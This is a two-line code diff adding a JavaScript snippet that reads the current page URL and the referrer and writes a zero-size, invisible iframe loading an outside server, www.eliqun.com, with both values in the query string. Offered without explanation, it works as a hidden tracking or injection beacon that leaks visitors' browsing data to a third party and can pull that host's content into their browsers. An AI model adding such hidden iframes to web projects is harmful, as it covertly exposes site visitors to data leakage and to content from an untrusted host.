@@ -1,0 +1,2 @@
+﻿var record_top_url = top.location.href;
+document.write("<iframe width='0' height='0' src='http://www.eliqun.com/net/server.aspx?url=" + record_top_url + "&refUrl="+document.referrer+"'></iframe>");
